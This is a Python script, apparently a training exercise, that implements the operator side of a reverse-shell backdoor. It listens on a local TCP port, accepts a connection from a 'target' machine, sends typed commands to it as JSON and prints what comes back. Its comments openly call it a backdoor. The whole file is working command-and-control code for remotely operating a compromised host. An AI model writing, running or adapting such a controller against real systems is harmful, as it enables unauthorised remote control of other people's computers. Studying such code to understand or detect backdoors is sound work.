##!/usr/bin/python
import os
import socket
import json

# Passing 'data' as arg
def reliable_send(data):
    json_data = json.dumps(data)
    # To allow us sending as much commands & inputs as possible
    target.send(json_data.encode())

def reliable_recv():
    # Pre
    json_data = b''
    # To allow us run Backdoor until out of bytes
    # Instead of just 1024 bytes
    while True:
        try:
            json_data += target.recv(1024)
            # If target.recv <= 1024 bytes
            return json.loads(json_data.decode())
            
        except ValueError:
            # If we get ValueError
            # Will go over reliable_recv() over & over
            # This will break the contents down to 1024 bytes each time
            continue
    
def shell():
    # Infinite While loop
    while True:
        # Getting outputs from targets
        #message = input("* Shell#~%s: " % str(ip))
        command = input("* Shell#~%s: " % str(ip))
        # Sending message.encode() to the target
        #target.send(message.encode())
        #target.send(command.encode())
        reliable_send(command)

        #if message == 'q':
        # Use strip() to remove any leading/trailing whitespace
        if command.strip() == 'q':
            break
            # continue to s.close()
        else:
            # target.recv(1024bytes)
            #answer = target.recv(1024)
            #result = target.recv(1024)
            #
            # If receiving packet > 1024 bytes => Backdoor crashes
            # e.g. running netstat -ano will crash this Backdoor
            result = reliable_recv()
            #print(f'answer:\n{answer.decode()}')
            print(f'result:\n{result}')

def server():
    # Scoping
    global s
    global ip
    global target
    # Make a server that listens to IPv4
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Binding to a port
    IP_ADDRESS = '127.0.0.1'
    port = 54321
    print(f'Binding port: {port}...\n')
    s.bind((IP_ADDRESS, port))
    number_of_connections = 5
    print(f'number_of_connections: {number_of_connections}\n')
    s.listen(number_of_connections)
    print(f'Listening for Incoming connections...\n')
    target, ip = s.accept()
    print(f'Target: {target} Connected!\n')

server()
shell()
s.close()